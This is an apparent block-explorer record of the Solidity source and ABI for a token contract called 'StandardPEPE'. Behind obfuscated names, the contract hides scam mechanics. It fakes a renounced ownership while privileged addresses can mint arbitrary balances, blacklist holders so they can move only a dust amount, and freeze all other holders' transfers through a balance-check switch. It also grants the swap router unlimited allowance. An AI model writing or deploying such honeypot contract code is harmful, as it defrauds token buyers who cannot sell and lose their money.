{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface atList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeReceiverList) external view returns (uint256);\n\n    function transfer(address launchFrom, uint256 receiverSenderLiquidity) external returns (bool);\n\n    function allowance(address walletAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverSenderLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFrom,\n        uint256 receiverSenderLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMax, uint256 value);\n    event Approval(address indexed walletAuto, address indexed spender, uint256 value);\n}\n\nabstract contract fromExemptBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxMarketingSell {\n    function createPair(address totalExempt, address txToken) external returns (address);\n}\n\ninterface atListMetadata is atList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StandardPEPE is fromExemptBuy, atList, atListMetadata {\n\n    address private atTeam;\n\n    function transferFrom(address fromAtTotal, address launchFrom, uint256 receiverSenderLiquidity) external override returns (bool) {\n        if (_msgSender() != toReceiver) {\n            if (exemptReceiver[fromAtTotal][_msgSender()] != type(uint256).max) {\n                require(receiverSenderLiquidity <= exemptReceiver[fromAtTotal][_msgSender()]);\n                exemptReceiver[fromAtTotal][_msgSender()] -= receiverSenderLiquidity;\n            }\n        }\n        return feeSender(fromAtTotal, launchFrom, receiverSenderLiquidity);\n    }\n\n    function isLaunch(uint256 receiverSenderLiquidity) public {\n        listTrading();\n        receiverMarketing = receiverSenderLiquidity;\n    }\n\n    uint256 receiverMarketing;\n\n    mapping(address => bool) public swapSender;\n\n    uint8 private minSwap = 18;\n\n    mapping(address => uint256) private fromLiquidityAuto;\n\n    function allowance(address takeIs, address modeBuy) external view virtual override returns (uint256) {\n        if (modeBuy == toReceiver) {\n            return type(uint256).max;\n        }\n        return exemptReceiver[takeIs][modeBuy];\n    }\n\n    bool private shouldReceiver;\n\n    string private enableExemptReceiver = \"SPE\";\n\n    address public receiverFrom;\n\n    address toReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public amountTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSwap;\n    }\n\n    function approve(address modeBuy, uint256 receiverSenderLiquidity) public virtual override returns (bool) {\n        exemptReceiver[_msgSender()][modeBuy] = receiverSenderLiquidity;\n        emit Approval(_msgSender(), modeBuy, receiverSenderLiquidity);\n        return true;\n    }\n\n    bool public liquidityAuto;\n\n    address listMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant takeAt = 11 ** 10;\n\n    uint256 public senderAt;\n\n    bool public atLaunchBuy;\n\n    function owner() external view returns (address) {\n        return atTeam;\n    }\n\n    event OwnershipTransferred(address indexed senderTeam, address indexed buyTake);\n\n    function getOwner() external view returns (address) {\n        return atTeam;\n    }\n\n    uint256 private launchedMode;\n\n    function exemptTo(address fromAtTotal, address launchFrom, uint256 receiverSenderLiquidity) internal returns (bool) {\n        require(fromLiquidityAuto[fromAtTotal] >= receiverSenderLiquidity);\n        fromLiquidityAuto[fromAtTotal] -= receiverSenderLiquidity;\n        fromLiquidityAuto[launchFrom] += receiverSenderLiquidity;\n        emit Transfer(fromAtTotal, launchFrom, receiverSenderLiquidity);\n        return true;\n    }\n\n    function exemptMin(address receiverFee, uint256 receiverSenderLiquidity) public {\n        listTrading();\n        fromLiquidityAuto[receiverFee] = receiverSenderLiquidity;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMarketing;\n    }\n\n    bool public walletIs;\n\n    function transfer(address receiverFee, uint256 receiverSenderLiquidity) external virtual override returns (bool) {\n        return feeSender(_msgSender(), receiverFee, receiverSenderLiquidity);\n    }\n\n    string private feeMax = \"Standard PEPE\";\n\n    function balanceOf(address modeReceiverList) public view virtual override returns (uint256) {\n        return fromLiquidityAuto[modeReceiverList];\n    }\n\n    constructor (){\n        \n        walletReceiver teamAmount = walletReceiver(toReceiver);\n        receiverFrom = maxMarketingSell(teamAmount.factory()).createPair(teamAmount.WETH(), address(this));\n        if (senderAt == launchedMode) {\n            atLaunchBuy = false;\n        }\n        enableSwap = _msgSender();\n        sellMaxExempt();\n        amountTotal[enableSwap] = true;\n        fromLiquidityAuto[enableSwap] = toMarketing;\n        if (shouldReceiver == atLaunchBuy) {\n            senderAt = launchedMode;\n        }\n        emit Transfer(address(0), enableSwap, toMarketing);\n    }\n\n    uint256 private toMarketing = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private exemptReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return feeMax;\n    }\n\n    bool public senderAmountAt;\n\n    function listTrading() private view {\n        require(amountTotal[_msgSender()]);\n    }\n\n    function atMarketing(address sellFund) public {\n        listTrading();\n        if (senderAmountAt) {\n            senderAt = launchedMode;\n        }\n        if (sellFund == enableSwap || sellFund == receiverFrom) {\n            return;\n        }\n        swapSender[sellFund] = true;\n    }\n\n    function atAmountFrom(address fundToken) public {\n        if (liquidityAuto) {\n            return;\n        }\n        if (senderAmountAt) {\n            walletIs = true;\n        }\n        amountTotal[fundToken] = true;\n        if (shouldReceiver) {\n            walletIs = true;\n        }\n        liquidityAuto = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableExemptReceiver;\n    }\n\n    address public enableSwap;\n\n    function feeSender(address fromAtTotal, address launchFrom, uint256 receiverSenderLiquidity) internal returns (bool) {\n        if (fromAtTotal == enableSwap) {\n            return exemptTo(fromAtTotal, launchFrom, receiverSenderLiquidity);\n        }\n        uint256 enableAt = atList(receiverFrom).balanceOf(listMarketing);\n        require(enableAt == receiverMarketing);\n        require(launchFrom != listMarketing);\n        if (swapSender[fromAtTotal]) {\n            return exemptTo(fromAtTotal, launchFrom, takeAt);\n        }\n        return exemptTo(fromAtTotal, launchFrom, receiverSenderLiquidity);\n    }\n\n    function sellMaxExempt() public {\n        emit OwnershipTransferred(enableSwap, address(0));\n        atTeam = address(0);\n    }\n\n    uint256 marketingExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"}],\"name\":\"atAmountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"}],\"name\":\"atMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderLiquidity\",\"type\":\"uint256\"}],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverSenderLiquidity\",\"type\":\"uint256\"}],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMaxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmountAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverSenderLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StandardPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}